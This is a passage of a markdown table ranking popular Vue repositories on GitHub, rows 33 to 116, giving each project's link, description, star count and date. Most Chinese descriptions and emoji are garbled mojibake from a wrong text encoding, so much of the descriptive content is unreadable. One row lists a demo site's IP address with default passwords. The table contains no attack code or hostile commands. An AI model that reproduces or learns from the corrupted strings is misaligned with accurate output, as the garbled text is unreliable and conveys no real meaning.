|33|[TaleLin/lin-cms-vue](https://github.com/TaleLin/lin-cms-vue)| üîÜ Vue+ElementUIÊûÑÂª∫ÁöÑCMSÂºÄÂèëÊ°ÜÊû∂|1.7k|Vue|10/29|
|34|[sunzongzheng/music](https://github.com/sunzongzheng/music)|electronË∑®Âπ≥Âè∞Èü≥‰πêÊí≠ÊîæÂô®ÔºõÂèØÊêúÁΩëÊòì‰∫ë„ÄÅQQÈü≥‰πê„ÄÅËôæÁ±≥Èü≥‰πêÔºõÊîØÊåÅQQ„ÄÅÂæÆÂçö„ÄÅGithubÁôªÂΩïÔºå‰∫ëÊ≠åÂçï; ÊîØÊåÅ‰∏ÄÈîÆÂØºÂÖ•Èü≥‰πêÂπ≥Âè∞Ê≠åÂçï|1.5k|Vue|10/29|
|35|[Sioxas/vue-music](https://github.com/Sioxas/vue-music)|Vue Èü≥‰πêÊêúÁ¥¢„ÄÅÊí≠Êîæ Demo|1.5k|Vue|10/19|
|36|[KuangPF/mpvue-weui](https://github.com/KuangPF/mpvue-weui)|Áî® vue ÂÜôÂ∞èÁ®ãÂ∫èÔºåÂü∫‰∫é mpvue Ê°ÜÊû∂ÈáçÂÜô weui„ÄÇ|1.4k|Vue|09/10|
|37|[0xbug/Hawkeye](https://github.com/0xbug/Hawkeye)|GitHub Ê≥ÑÈú≤ÁõëÊéßÁ≥ªÁªü(GitHub Sensitive Information Leakage Monitor Spider)|1.4k|Vue|10/02|
|38|[a54552239/pearProject](https://github.com/a54552239/pearProject)|pearÔºåÊ¢®Â≠êÔºåËΩªÈáèÁ∫ßÁöÑÂú®Á∫øÈ°πÁõÆ/‰ªªÂä°Âçè‰ΩúÁ≥ªÁªüÔºåËøúÁ®ãÂäûÂÖ¨Âçè‰Ωú|1.4k|Vue|09/08|
|39|[sl1673495/vue-netease-music](https://github.com/sl1673495/vue-netease-music)|üéµ Âü∫‰∫é Vue2„ÄÅVue-CLI3 ÁöÑÈ´ò‰ªøÁΩëÊòì‰∫ë mac ÂÆ¢Êà∑Á´ØÊí≠ÊîæÂô®ÔºàPCÔºâ Online Music Player|1.3k|Vue|09/10|
|40|[GitHub-Laziji/VBlog](https://github.com/GitHub-Laziji/VBlog)|‰ΩøÁî®GitHub API Êê≠Âª∫‰∏Ä‰∏™ÂèØÂä®ÊÄÅÂèëÂ∏ÉÊñáÁ´†ÁöÑÂçöÂÆ¢|1.3k|Vue|05/10|
|41|[dingyong0214/ThorUI-uniapp](https://github.com/dingyong0214/ThorUI-uniapp)|ThorUIÁªÑ‰ª∂Â∫ìÔºåuni-appÈ°πÁõÆ‰ª£Á†ÅÂàÜ‰∫´ÔºåÁªÑ‰ª∂ÊñáÊ°£Âú∞ÂùÄÔºöhttps://thorui.cn/doc/    „ÄÇ    ÊúÄËøëÊõ¥Êñ∞Êó∂Èó¥Ôºö2020-09-02|1.3k|Vue|09/02|
|42|[dcloudio/hello-uniapp](https://github.com/dcloudio/hello-uniapp)|uni-appÊ°ÜÊû∂ÊºîÁ§∫Á§∫‰æã|1.3k|Vue|10/28|
|43|[maomao1996/Vue-mmPlayer](https://github.com/maomao1996/Vue-mmPlayer)|üéµ Âü∫‰∫é Vue ÁöÑÂú®Á∫øÈü≥‰πêÊí≠ÊîæÂô®ÔºàPCÔºâ Online music player|1.3k|Vue|09/17|
|44|[HongqingCao/GitDataV](https://github.com/HongqingCao/GitDataV)|Âü∫‰∫éVueÊ°ÜÊû∂ÊûÑÂª∫ÁöÑgithubÊï∞ÊçÆÂèØËßÜÂåñÂπ≥Âè∞|1.2k|Vue|09/06|
|45|[shfshanyue/Daily-Question](https://github.com/shfshanyue/Daily-Question)|‰∫íËÅîÁΩëÂ§ßÂéÇÂÜÖÊé®ÂèäÂ§ßÂéÇÈù¢ÁªèÊï¥ÁêÜÔºåÂπ∂‰∏îÊØèÂ§©‰∏ÄÈÅìÈù¢ËØïÈ¢òÊé®ÈÄÅ„ÄÇÊØèÂ§©‰∫îÂàÜÈíüÔºåÂçäÂπ¥Â§ßÂéÇ‰∏≠|1.2k|Vue|10/27|
|46|[xiaozhu188/electron-vue-cloud-music](https://github.com/xiaozhu188/electron-vue-cloud-music)|üöÄElectron + Vue ‰ªøÁΩëÊòì‰∫ëÈü≥‰πêwindowsÂÆ¢Êà∑Á´Ø|1.2k|Vue|10/06|
|47|[myide/see](https://github.com/myide/see)|Âü∫‰∫éÂºÄÊ∫êÁªÑ‰ª∂ÔºàInception & SQLAdvisor & SOARÔºâÁöÑSQLÂÆ°Ê†∏&SQL‰ºòÂåñÁöÑWebÂπ≥Âè∞|1.1k|Vue|10/28|
|48|[biaochenxuying/blog-vue-typescript](https://github.com/biaochenxuying/blog-vue-typescript)|vue + typescript + element-ui ÊîØÊåÅ markdown Ê∏≤ÊüìÁöÑÂçöÂÆ¢ÂâçÂè∞Â±ïÁ§∫|1.1k|Vue|09/23|
|49|[jae-jae/Userscript-Plus](https://github.com/jae-jae/Userscript-Plus)|:monkey: Show current site all UserJSÔºåThe easier way to install UserJs for Tampermonkey. ÊòæÁ§∫ÂΩìÂâçÁΩëÁ´ôÁöÑÊâÄÊúâÂèØÁî®TampermonkeyËÑöÊú¨|1.1k|Vue|10/11|
|50|[dongyuanxin/blog](https://github.com/dongyuanxin/blog)|üìö ‰∏ìÊ≥®Web‰∏éÁÆóÊ≥ï|1.0k|Vue|10/21|
|51|[llldddbbb/dbblog](https://github.com/llldddbbb/dbblog)|Âü∫‰∫éSpringBoot2.x+Vue2.x+ElementUI+Iview+Elasticsearch+RabbitMQ+Redis+ShiroÁöÑÂ§öÊ®°ÂùóÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂçöÂÆ¢È°πÁõÆ|988|Vue|09/04|
|52|[chenxuan0000/vue-seamless-scroll](https://github.com/chenxuan0000/vue-seamless-scroll)| :beginner:A simple, seamless scrolling for Vue.js  vueÊó†ÁºùÊªöÂä®component|968|Vue|10/21|
|53|[lavyun/vue-demo-kugou](https://github.com/lavyun/vue-demo-kugou)|ÈÖ∑Áãówebapp demo(vue2.0+vue-router+vuex)|950|Vue|09/05|
|54|[loveRandy/vue-cli3.0-vueadmin](https://github.com/loveRandy/vue-cli3.0-vueadmin)|Âü∫‰∫évue-cli3.0+vue+elementUI+vuex+axios+ÊùÉÈôêÁÆ°ÁêÜÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|937|Vue|09/10|
|55|[eshengsky/iBlog](https://github.com/eshengsky/iBlog)|Âü∫‰∫é Node.js ÁöÑÂºÄÊ∫ê‰∏™‰∫∫ÂçöÂÆ¢Á≥ªÁªüÔºåÈááÁî® Nuxt + Vue + TypeScript ÊäÄÊúØÊ†à„ÄÇ|922|Vue|09/19|
|56|[fofapro/vulfocus](https://github.com/fofapro/vulfocus)|üöÄVulfocus ÊòØ‰∏Ä‰∏™ÊºèÊ¥ûÈõÜÊàêÂπ≥Âè∞ÔºåÂ∞ÜÊºèÊ¥ûÁéØÂ¢É docker ÈïúÂÉèÔºåÊîæÂÖ•Âç≥ÂèØ‰ΩøÁî®ÔºåÂºÄÁÆ±Âç≥Áî®„ÄÇ|898|Vue|09/04|
|57|[IFmiss/vue-music](https://github.com/IFmiss/vue-music)|Âü∫‰∫évue2.0ÁöÑÁΩëÊòì‰∫ëÈü≥‰πêÊí≠ÊîæÂô®ÔºåapiÊù•Ëá™‰∫éNeteaseCloudMusicApiÔºåv2.0‰∏∫ÊúÄÊñ∞ÁâàÊú¨|845|Vue|09/05|
|58|[Mynameisfwk/vivo-shop](https://github.com/Mynameisfwk/vivo-shop)|Âü∫‰∫évue2.0ÂÆûÁé∞ÁöÑvivoÁßªÂä®Á´ØÂïÜÂüé(vue+vuex-ruoter+vue-axios+webpack)|840|Vue|09/30|
|59|[dcloudio/uni-ui](https://github.com/dcloudio/uni-ui)|Âü∫‰∫éuni-appÁöÑuiÊ°ÜÊû∂|802|Vue|10/29|
|60|[lss5270/vue-admin-spa](https://github.com/lss5270/vue-admin-spa)|Âü∫‰∫évue2.0ÁîüÊÄÅÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÊ®°ÊùøÔºàspaÔºâ„ÄÇ a vue management system template based on Ôºövue2.0 + vue-router + vuex + element-ui +ES6+ webpack + npm„ÄÇ|762|Vue|09/04|
|61|[geekape/geek-navigation](https://github.com/geekape/geek-navigation)|‚ù§Ô∏è ÊûÅÂÆ¢ÁåøÊ¢¶ÂØºËà™ÔºçÁã¨Á´ãÂºÄÂèëËÄÖÁöÑÂØºËà™Á´ôÔºÅ|762|Vue|09/13|
|62|[inoutcode/ethereum_book](https://github.com/inoutcode/ethereum_book)|Á≤æÈÄö‰ª•Â§™Âùä Ôºà‰∏≠ÊñáÁâàÔºâ|725|Vue|07/04|
|63|[zhengguorong/h5maker](https://github.com/zhengguorong/h5maker)|h5ÁºñËæëÂô®Á±ª‰ººmaka„ÄÅÊòì‰ºÅÁßÄ Ë¥¶Âè∑/ÂØÜÁ†ÅÔºöadmin|716|Vue|08/05|
|64|[fengT-T/996_list](https://github.com/fengT-T/996_list)|996 ÂÖ¨Âè∏Â±ïÁ§∫„ÄÅËÆ®ËÆ∫|703|Vue|09/08|
|65|[wuyawei/Vchat](https://github.com/wuyawei/Vchat)|üíòüç¶üôàVchat ‚Äî ‰ªéÂ§¥Âà∞ËÑöÔºåÊí∏‰∏Ä‰∏™Á§æ‰∫§ËÅäÂ§©Á≥ªÁªüÔºàvue + node + mongodbÔºâ|686|Vue|09/07|
|66|[jsososo/NeteaseMusic](https://github.com/jsososo/NeteaseMusic)|ÁΩëÊòì‰∫ëÈü≥‰πê & QQÈü≥‰πê & Âí™ÂíïÈü≥‰πê Á¨¨‰∏âÊñπ webÁ´Ø (ÂèØÊí≠Êîæ vip„ÄÅ‰∏ãÊû∂Ê≠åÊõ≤)|681|Vue|10/23|
|67|[shuiRong/VueCnodeJS](https://github.com/shuiRong/VueCnodeJS)|‚öΩÔ∏èüéâVueÂàù/‰∏≠Á∫ßÈ°πÁõÆÔºåCnodeJSÁ§æÂå∫ÈáçÊûÑ„ÄÇ( a junior project of Vue.js, rewrite cnodejs.org ) È¢ÑËßà(DEMO)Ôºö|680|Vue|07/12|
|68|[bxm0927/vue-meituan](https://github.com/bxm0927/vue-meituan)|:hamburger: :meat_on_bone: :fork_and_knife:  Âü∫‰∫éVue ÂÖ®ÂÆ∂Ê°∂ (2.x)Âà∂‰ΩúÁöÑÁæéÂõ¢Â§ñÂçñAPP |668|Vue|04/23|
|69|[topfullstack/node-vue-moba](https://github.com/topfullstack/node-vue-moba)|Node.js (Express.js) + Vue.js (Element UI) ÂÖ®Ê†àÂºÄÂèëÁéãËÄÖËç£ËÄÄÊâãÊú∫Á´ØÂÆòÁΩëÂíåÁÆ°ÁêÜÂêéÂè∞|660|Vue|09/08|
|70|[fy0/Icarus](https://github.com/fy0/Icarus)|üïäÔ∏è An opensource community/forum project write with python3 aiohttp and vue.js. ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÁ§æÂå∫Á®ãÂ∫èÔºå‰∏¥Êó∂ÊµãËØïÁ´ôÔºöhttps://t.myrpg.cn|637|Vue|10/28|
|71|[shfshanyue/blog](https://github.com/shfshanyue/blog)|Âú®ËøôÈáåÂÜô‰∏Ä‰∫õÂ∑•‰Ωú‰∏≠ÈÅáÂà∞ÁöÑÂâçÁ´ØÔºåÂêéÁ´Ø‰ª•ÂèäËøêÁª¥ÁöÑÈóÆÈ¢ò|620|Vue|10/27|
|72|[Exrick/xboot-front](https://github.com/Exrick/xboot-front)|Âü∫‰∫éVue+iView AdminÂºÄÂèëÁöÑXBootÂâçÂêéÁ´ØÂàÜÁ¶ªÂºÄÊîæÂπ≥Âè∞ÂâçÁ´Ø ÊùÉÈôêÂèØÊéßÂà∂Ëá≥ÊåâÈíÆÊòæÁ§∫ Âä®ÊÄÅË∑ØÁî±ÊùÉÈôêËèúÂçï/Â§öËØ≠Ë®Ä/ÁÆÄÊ¥ÅÁæéËßÇ ÂâçÂêéÁ´ØÂàÜÁ¶ª|615|Vue|10/30|
|73|[vincentSea/vue-webapp](https://github.com/vincentSea/vue-webapp)|Ego ÁßªÂä®Á´ØË¥≠Áâ©ÂïÜÂüé (vue+vuex-ruoter+webpack)|599|Vue|06/03|
|74|[dream2023/vue-ele-form](https://github.com/dream2023/vue-ele-form)|Âü∫‰∫éelement-uiÁöÑÊï∞ÊçÆÈ©±Âä®Ë°®ÂçïÁªÑ‰ª∂|570|Vue|10/23|
|75|[stavyan/TinyShop-UniApp](https://github.com/stavyan/TinyShop-UniApp)|Âü∫‰∫é RageFrame2 ÁöÑ‰∏ÄÊ¨æÂÖçË¥πÂºÄÊ∫êÁöÑÂü∫Á°ÄÂïÜÂüéÈîÄÂîÆÂäüËÉΩÁöÑÂºÄÊ∫êÂæÆÂïÜÂüé„ÄÇ|563|Vue|10/19|
|76|[heyui/heyui-admin](https://github.com/heyui/heyui-admin)|Âü∫‰∫é vue Âíå heyui ÁªÑ‰ª∂Â∫ìÁöÑ‰∏≠ÂêéÁ´ØÁ≥ªÁªü https://admin.heyui.top|561|Vue|09/10|
|77|[FatDong1/vue-blog](https://github.com/FatDong1/vue-blog)|üî• Vue.js+Node.js+MongodbÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∏™‰∫∫ÂçöÂÆ¢|555|Vue|10/03|
|78|[lfyfly/vue-waterfall-easy](https://github.com/lfyfly/vue-waterfall-easy)|vueÁÄëÂ∏ÉÊµÅÁªÑ‰ª∂(vue-waterfall-easy 2.x)|542|Vue|09/04|
|79|[F-loat/ithome-lite](https://github.com/F-loat/ithome-lite)|ü•õ IT‰πãÂÆ∂Á¨¨‰∏âÊñπÂ∞èÁ®ãÂ∫èÁâàÂÆ¢Êà∑Á´ØÔºà‰ΩøÁî® mpvue ÂºÄÂèëÔºåÂÖºÂÆπ webÔºâ|535|Vue|09/05|
|80|[Awheat/vue2-douban-market](https://github.com/Awheat/vue2-douban-market)|ËøôÊòØÂü∫‰∫évue2 + vue-router2 + vuex + axios ‰ªø(Ë±ÜÁì£Â∏ÇÈõÜ)ÁöÑ‰∏Ä‰∏™webappÈ°πÁõÆÔºÅ|525|Vue|05/19|
|81|[mohuishou/scuplus-wechat](https://github.com/mohuishou/scuplus-wechat)|WeÂ∑ùÂ§ßÂ∞èÁ®ãÂ∫è[scuplus] ‰ΩøÁî®wepyÂºÄÂèëÁöÑÂÆåÂñÑÁöÑÊ†°Âõ≠ÁªºÂêàÂ∞èÁ®ãÂ∫è, 40+È°µÈù¢ÔºåÂâçÂêéÁ´ØÂºÄÊ∫êÔºåÂåÖÊã¨ÊàêÁª©„ÄÅËØæË°®„ÄÅÂ§±Áâ©ÊãõÈ¢Ü„ÄÅÂõæ‰π¶È¶Ü„ÄÅÊñ∞ÈóªËµÑËÆØÁ≠âÁ≠âÂ∏∏ËßÅÊ†°Âõ≠Âú∫ÊôØÂäüËÉΩ|523|Vue|06/03|
|82|[xugaoyi/vuepress-theme-vdoing](https://github.com/xugaoyi/vuepress-theme-vdoing)|üöÄ‰∏ÄÊ¨æÁÆÄÊ¥ÅÈ´òÊïàÁöÑVuePress Áü•ËØÜÁÆ°ÁêÜ&ÂçöÂÆ¢(blog) ‰∏ªÈ¢ò|504|Vue|10/29|
|83|[wangy8961/flask-vuejs-madblog](https://github.com/wangy8961/flask-vuejs-madblog)|Âü∫‰∫é Flask Âíå Vue.js ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂæÆÂûãÂçöÂÆ¢È°πÁõÆÔºåÊîØÊåÅÂ§öÁî®Êà∑„ÄÅMarkdownÊñáÁ´†ÔºàÂñúÊ¨¢/Êî∂ËóèÊñáÁ´†Ôºâ„ÄÅÁ≤â‰∏ùÂÖ≥Ê≥®„ÄÅÁî®Êà∑ËØÑËÆ∫ÔºàÁÇπËµûÔºâ„ÄÅÂä®ÊÄÅÈÄöÁü•„ÄÅÁ´ôÂÜÖÁßÅ‰ø°„ÄÅÈªëÂêçÂçï„ÄÅÈÇÆ‰ª∂ÊîØÊåÅ„ÄÅÁÆ°ÁêÜÂêéÂè∞„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅRQ‰ªªÂä°ÈòüÂàó„ÄÅElasticsearchÂÖ®ÊñáÊêúÁ¥¢„ÄÅLinux VPSÈÉ®ÁΩ≤„ÄÅDockerÂÆπÂô®ÈÉ®ÁΩ≤Á≠â|504|Vue|02/20|
|84|[WeBankFinTech/fes.js](https://github.com/WeBankFinTech/fes.js)|Fes.js ÊòØ‰∏ÄÂ•ó‰ºòÁßÄÁöÑ‰∏≠ÂêéÂè∞ÂâçÁ´ØËß£ÂÜ≥ÊñπÊ°à„ÄÇÊèê‰æõÂàùÂßãÈ°πÁõÆ„ÄÅÂºÄÂèëË∞ÉËØï„ÄÅMockÊé•Âè£„ÄÅÁºñËØëÊâìÂåÖÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇÂÜÖÁΩÆÂ∏ÉÂ±Ä„ÄÅÊùÉÈôê„ÄÅÊï∞ÊçÆÂ≠óÂÖ∏„ÄÅÁä∂ÊÄÅÁÆ°ÁêÜ„ÄÅÂ≠òÂÇ®„ÄÅApiÁ≠âÂ§ö‰∏™Ê®°Âùó„ÄÇ‰ª•Á∫¶ÂÆö„ÄÅÈÖçÁΩÆÂåñ„ÄÅÁªÑ‰ª∂ÂåñÁöÑËÆæËÆ°ÊÄùÊÉ≥ÔºåËÆ©Áî®Êà∑‰ªÖ‰ªÖÂÖ≥ÂøÉÁî®ÁªÑ‰ª∂Êê≠Âª∫È°µÈù¢ÂÜÖÂÆπ„ÄÇÂü∫‰∫éVue.jsÔºå‰∏äÊâãÁÆÄÂçï„ÄÇÁªèËøáÂ§ö‰∏™È°πÁõÆ‰∏≠ÊâìÁ£®ÔºåË∂ã‰∫éÁ®≥ÂÆö„ÄÇ|497|Vue|10/27|
|85|[x2rr/funds](https://github.com/x2rr/funds)|Ëá™ÈÄâÂü∫ÈáëÂä©ÊâãÊòØ‰∏ÄÊ¨æChromeÊâ©Â±ïÔºåÁî®Êù•Âø´ÈÄüËé∑ÂèñÂÖ≥Ê≥®Âü∫ÈáëÁöÑÂÆûÊó∂Êï∞ÊçÆÔºåÊü•ÁúãËá™ÈÄâÂü∫ÈáëÁöÑÂÆûÊó∂‰º∞ÂÄºÊÉÖÂÜµ|495|Vue|10/29|
|86|[snowlyg/IrisAdminApi](https://github.com/snowlyg/IrisAdminApi)|iris Ê°ÜÊû∂ÁöÑÂêéÂè∞apiÈ°πÁõÆ|485|Vue|10/27|
|87|[zhaotoday/iview](https://github.com/zhaotoday/iview)|admin template based on Vue CLI 3 & iView. Âü∫‰∫é Vue CLI 3 + iView ÁöÑ Vue.js ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü„ÄÇ|481|Vue|07/04|
|88|[mafengwo/vue-drag-tree-table](https://github.com/mafengwo/vue-drag-tree-table)|vue ÂèØ‰ª•ÊãñÊãΩÊéíÂ∫èÁöÑÊ†ëÂΩ¢Ë°®Ê†º|447|Vue|09/09|
|89|[anjoy8/Blog.Admin](https://github.com/anjoy8/Blog.Admin)|‚ú® Âü∫‰∫évue ÁöÑÁÆ°ÁêÜÂêéÂè∞ÔºåÈÖçÂêàBlog.Core‰∏éBlog.VueÁ≠âÂ§ö‰∏™È°πÁõÆ‰ΩøÁî®|446|Vue|10/21|
|90|[ykfe/fe-dev-playbook](https://github.com/ykfe/fe-dev-playbook)|Êïô‰Ω†Â¶Ç‰ΩïÊâìÈÄ†ËàíÈÄÇ„ÄÅÈ´òÊïà„ÄÅÊó∂Â∞öÁöÑÂâçÁ´ØÂºÄÂèëÁéØÂ¢É|446|Vue|04/06|
|91|[woai3c/vue-admin-template](https://github.com/woai3c/vue-admin-template)|Vue ËΩªÈáèÁ∫ßÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂü∫Á°ÄÊ®°Êùø|436|Vue|08/30|
|92|[artiely/vue-admin-iview](https://github.com/artiely/vue-admin-iview)|vueÂêéÁ´ØÁÆ°ÁêÜÁ≥ªÁªüÁïåÈù¢ Âü∫‰∫éuiÁªÑ‰ª∂iview|425|Vue|04/30|
|93|[wsydxiangwang/Mood](https://github.com/wsydxiangwang/Mood)|VueÁöÑNuxt.jsÊúçÂä°Á´ØÊ∏≤ÊüìÊ°ÜÊû∂ÔºåNodeJS‰∏∫ÂêéÁ´ØÁöÑÂÖ®Ê†àÈ°πÁõÆÔºåDocker‰∏ÄÈîÆÈÉ®ÁΩ≤ÔºåÈù¢ÂêëÂ∞èÁôΩÁöÑÂÆåÁæéÂçöÂÆ¢Á≥ªÁªü|424|Vue|10/22|
|94|[lazzyfu/YaSQL](https://github.com/lazzyfu/YaSQL)|Âü∫‰∫éPythonÂºÄÂèëÁöÑMySQL WEBÁâàÊú¨ÁöÑÂ∑•ÂçïÂÆ°Ê†∏ÊâßË°åÂπ≥Âè∞|421|Vue|10/28|
|95|[pandaGao/bilibili-live-helper](https://github.com/pandaGao/bilibili-live-helper)|BilibiliÁõ¥Êí≠ÂºπÂπïÂ∫ì for Mac / Windows / Linux|413|Vue|09/05|
|96|[xiaowang1314/uniapp-plugin-collections](https://github.com/xiaowang1314/uniapp-plugin-collections)|uni-appÈ°πÁõÆÊèí‰ª∂ÂäüËÉΩÈõÜÂêàhttps://github.com/xiaowang1314/uniapp-plugin-collections|413|Vue|10/16|
|97|[TangSY/echarts-map-demo](https://github.com/TangSY/echarts-map-demo)|echartsÂú∞ÂõæËæπÁïåÊï∞ÊçÆÁöÑÂÆûÊó∂Ëé∑Âèñ‰∏éÂ∫îÁî®ÔºåÁúÅÂ∏ÇÂå∫ÂéøÂ§öÁ∫ßËÅîÂä®‰∏ãÈíªÔºåÁúüÊ≠£ÊÑè‰πâÁöÑ‰∏ãÈíªËá≥ÂéøÁ∫ß„ÄêÈôÑÊúÄÊñ∞geoJsonÊñá‰ª∂‰∏ãËΩΩ„Äë|405|Vue|10/28|
|98|[19920625lsg/spring-boot-online-exam](https://github.com/19920625lsg/spring-boot-online-exam)|Âü∫‰∫éSpring BootÁöÑÂú®Á∫øËÄÉËØïÁ≥ªÁªü(È¢ÑËßàÂú∞ÂùÄ http://129.211.88.191 ÔºåË¥¶Êà∑ÂàÜÂà´ÊòØadmin„ÄÅteacher„ÄÅstudentÔºåÂØÜÁ†ÅÊòØadmin123)|403|Vue|10/26|
|99|[powerdong/Music-player](https://github.com/powerdong/Music-player)|VueÈ´ò‰ªøÁΩëÊòì‰∫ëÈü≥‰πê(VueÂÖ•Èó®ÂÆûË∑µ)‚Äî‚ÄîÂú®Á∫øÈ¢ÑËßà -- ÊöÇÊó∂ÂÅúÊ≠¢|396|Vue|09/11|
|100|[bigbaser/Tcloud](https://github.com/bigbaser/Tcloud)|Tcloud‰∫ëÊµãÂπ≥Âè∞ÂâçÁ´ØÔºåÊñ∞Âú∞ÂùÄÔºöhttps://github.com/JunManYuanLong/Tcloud|395|Vue|08/04|
|101|[infinityu/mina-wear-mask](https://github.com/infinityu/mina-wear-mask)|Â§¥ÂÉèÂä†Âè£ÁΩ©Â∞èÁ®ãÂ∫è - Âü∫‰∫éuniapp‰ΩøÁî®vueÂø´ÈÄüÂÆûÁé∞|392|Vue|07/09|
|102|[wjkang/d2-admin-pm](https://github.com/wjkang/d2-admin-pm)|Âü∫‰∫é d2-adminÁöÑRBACÊùÉÈôêÁÆ°ÁêÜËß£ÂÜ≥ÊñπÊ°à|387|Vue|09/04|
|103|[leadream/wedding-invitation-for-programmers](https://github.com/leadream/wedding-invitation-for-programmers)|Á®ãÂ∫èÁåøÁöÑÂ©öÁ§ºÈÇÄËØ∑ÂáΩ„ÄÇ|376|Vue|10/13|
|104|[YaoZeyuan/stablog](https://github.com/YaoZeyuan/stablog)|Á®≥ÈÉ®ËêΩ. ‰∏ì‰∏öÂ§á‰ªΩÂØºÂá∫ÂæÆÂçöËÆ∞ÂΩï, Á®≥!|372|Vue|07/07|
|105|[hql7/tree-transfer](https://github.com/hql7/tree-transfer)|‰∏Ä‰∏™Âü∫‰∫évueÂíåelement-uiÁöÑÊ†ëÂΩ¢Á©øÊ¢≠Ê°ÜÂèäÈÇÆ‰ª∂ÈÄöËÆØÂΩï„ÄÇA tree shaped shuttle box assembly based on Vue and element-ui.  Vuecli3ÁâàÊú¨ËßÅhttps://github.com/hql7/wl-tree-transfer  Á§∫‰æãËßÅ->|371|Vue|10/26|
|106|[bingo-oss/bui-weex](https://github.com/bingo-oss/bui-weex)|‰∏ìÈó®‰∏∫ Weex ÂâçÁ´ØÂºÄÂèëËÄÖÊâìÈÄ†ÁöÑ‰∏ÄÂ•óÈ´òË¥®ÈáèUIÊ°ÜÊû∂|371|Vue|10/27|
|107|[CNOliverZhang/PotatofieldImageToolkit](https://github.com/CNOliverZhang/PotatofieldImageToolkit)|‰∏Ä‰∏™ÈÄÇÁî®‰∫éÊëÑÂΩ±‰ªé‰∏öËÄÖ/Áà±Â•ΩËÄÖ„ÄÅËÆæËÆ°Â∏àÁ≠âÂàõÊÑèË°å‰∏ö‰ªé‰∏öËÄÖÁöÑÂõæÂÉèÂ∑•ÂÖ∑ÁÆ±„ÄÇ|369|Vue|10/11|
|108|[hilanmiao/LanMiaoDesktop](https://github.com/hilanmiao/LanMiaoDesktop)|‰∏Ä‰∏™ÂÆåÊï¥electronÊ°åÈù¢ËÆ∞Ë¥¶Á®ãÂ∫èÔºåÊäÄÊúØÊ†à‰∏ªË¶Å‰ΩøÁî®electron-vue+vuetify„ÄÇÂºÄÊú∫Ëá™Âä®ÂêØÂä®ÔºåËá™Âä®Êõ¥Êñ∞ÔºåÊâòÁõòÊúÄÂ∞èÂåñÔºåÈó™ÁÉÅÁ≠âÂ∏∏Áî®ÂäüËÉΩÔºåNsisÂà∂‰ΩúÊºÇ‰∫ÆÁöÑÂÆâË£ÖÂåÖ„ÄÇ|366|Vue|09/12|
|109|[Neveryu/vue-cms](https://github.com/Neveryu/vue-cms)|Âü∫‰∫é Vue Âíå ElementUI ÊûÑÂª∫ÁöÑ‰∏Ä‰∏™‰ºÅ‰∏öÁ∫ßÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|362|Vue|10/26|
|110|[wechat-miniprogram/kbone-ui](https://github.com/wechat-miniprogram/kbone-ui)|kbone-ui ÊòØ‰∏ÄÂ•óËÉΩÂêåÊó∂ÊîØÊåÅ Â∞èÁ®ãÂ∫è(kbone) Âíå vue Ê°ÜÊû∂ÂºÄÂèëÁöÑÂ§öÁ´Ø UI Â∫ì|359|Vue|09/22|
|111|[TruthHun/BookChatApp](https://github.com/TruthHun/BookChatApp)|ÈÄöÁî®‰π¶Á±çÈòÖËØªAPPÔºåBookChat ÁöÑ uni-app ÂÆûÁé∞ÁâàÊú¨ÔºåÊîØÊåÅÂ§öÁ´ØÂàÜÂèëÔºåÁºñËØëÁîüÊàêAndroidÂíåiOS ÊâãÊú∫APP‰ª•ÂèäÂêÑÂπ≥Âè∞ÁöÑÂ∞èÁ®ãÂ∫è|358|Vue|05/13|
|112|[zhaoyiming0803/VueNode](https://github.com/zhaoyiming0803/VueNode)|VueNode ÊòØ‰∏ÄÂ•óÂü∫‰∫é TypeScript + Vue.js + Node.js + MySQL ÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÈ°πÁõÆ„ÄÇ|358|Vue|09/18|
|113|[TyCoding/tumo-vue](https://github.com/TyCoding/tumo-vue)|Tumo Blog For Vue.js. ÂâçÂêéÁ´ØÂàÜÁ¶ª|356|Vue|07/28|
|114|[iamdarcy/hioshop-admin](https://github.com/iamdarcy/hioshop-admin)|Êµ∑È£éÂ∞èÂ∫ó,ÂºÄÊ∫êÂïÜÂüé,ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÁÆ°ÁêÜÂêéÂè∞,ÂêéÂè∞ÁÆ°ÁêÜ,VUE|348|Vue|09/11|
|115|[yangyuji/h5-factory](https://github.com/yangyuji/h5-factory)|h5Âà∂‰ΩúÔºåÁßªÂä®Á´Ø‰∏ìÈ¢òÊ¥ªÂä®È°µÈù¢ÂèØËßÜÂåñÁºñËæë|346|Vue|03/18|
|116|[Hzy0913/mpvue-calendar](https://github.com/Hzy0913/mpvue-calendar)|üìÖ ÂæÆ‰ø°Â∞èÁ®ãÂ∫è/ÊµèËßàÂô®Á´Ø vue calendar Êó•ÂéÜÁªÑ‰ª∂mpvue-calendar Âü∫‰∫émpvueÂπ≥Âè∞ ÊîØÊåÅÂÜúÂéÜ„ÄÅÊåâÂë®ÂàáÊç¢„ÄÅÂèØËá™ÂÆö‰πâ„ÄÇüéâüéâÁé∞Â∑≤ÂèØ‰ª•ÂêåÊó∂Âú®ÊµèËßàÂô®Á´Ø‰ΩøÁî®|344|Vue|09/09|
